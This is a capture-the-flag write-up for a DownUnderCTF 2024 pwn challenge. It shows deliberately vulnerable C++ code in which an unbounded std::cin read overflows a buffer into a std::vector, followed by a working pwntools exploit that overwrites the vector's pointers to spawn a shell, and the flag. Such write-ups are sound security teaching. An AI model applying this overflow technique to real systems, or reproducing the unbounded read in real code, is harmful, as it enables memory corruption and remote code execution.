https://ctftime.org/event/2284

# vector overflow (pwn)

Please overflow into the vector and control it!

nc 2024.ductf.dev 30013

https://play.duc.tf/challenges#vector%20overflow-42

## Analysis

We are given the following code:

```c++
#include <cstdlib>
#include <iostream>
#include <string>
#include <vector>

char buf[16];
std::vector<char> v = {'X', 'X', 'X', 'X', 'X'};

void lose() {
    puts("Bye!");
    exit(1);
}

void win() {
    system("/bin/sh");
    exit(0);
}

int main() {
    char ductf[6] = "DUCTF";
    char* d = ductf;

    std::cin >> buf;
    if(v.size() == 5) {
        for(auto &c : v) {
            if(c != *d++) {
                lose();
            }
        }

        win();
    }

    lose();
}
```

We can see that `std::cin >> buf;` allows us to overflow `buf` into `v`.

A `std::vector` is typically implemented as three pointers:

1) A pointer to start to the underlying allocation
2) A pointer to end of the currently in-use region of the underlying allocation
3) A pointer to the end of the underlying allocation - recall that vectors can have excess capacity

When we overflow `buf` we can change the way that code that interacts with `v` behaves by altering the pointers within `v`.

## Solution

1) Note the address of `buf`, using ghidra or ida, as `0x4051e0`
    - There is no PIE in this binary
2) Write `DUCTF` to the start of `buf` - we'll need to this pass the `c != *d++` check
3) Write `0` up to the end of `buf`
4) Overwrite `v` such that it point to `buf`
    - The vector should appear to contain 5 elements
    - The elements should appear to be the characters `DUCTF` that we wrote into `buf` earlier
    - In this case we can set the capacity of the array equal to 5 by setting the same pointer as we use to indicate the end of the in-use region

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./vector_overflow", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("2024.ductf.dev", 30013)

BUF = 0x4051e0

payload = b""
payload += b"DUCTF"
payload += b"\x00" * 11 # fill up to 16 bytes
payload += p64(BUF)     # v.start
payload += p64(BUF + 5) # v.end
payload += p64(BUF + 5) # v.capacity

p.sendline(payload)

p.interactive()
```

## Flag
`DUCTF{y0u_pwn3d_th4t_vect0r!!}`

smiley 2024/07/06
